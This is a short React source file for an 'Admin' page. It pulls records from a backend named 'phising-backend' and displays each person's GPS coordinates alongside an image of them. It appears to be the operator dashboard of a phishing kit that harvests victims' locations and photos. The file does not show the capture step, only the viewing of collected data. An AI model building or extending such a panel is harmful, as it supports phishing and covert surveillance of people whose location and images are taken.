import React, { useEffect, useState } from 'react';
import axios from 'axios';

const Admin = () => {
  const [data, setData] = useState([]); // State to store fetched data

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await axios.get('https://phising-backend.vercel.app/api/all');
        setData(response.data); // Set the fetched data to state
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };

    fetchData(); // Call the function to fetch data
  }, []);

  return (
    <div>
      {data.length > 0 ? (
        data.map((item) => (
          <div key={item.id} style={{ marginBottom: '20px' }}>
            <h2>Coordinates</h2>
            <p>Latitude: {item.coords.latitude}</p>
            <p>Longitude: {item.coords.longitude}</p>
            <h2>Image</h2>
            <img
              src={item.image} // Use the image URL from the backend
              alt={`User at ${item.coords.latitude}, ${item.coords.longitude}`}
              style={{ width: '300px', height: 'auto' }} // Optional styling
            />
          </div>
        ))
      ) : (
        <p>No data available</p>
      )}
    </div>
  );
};

export default Admin;
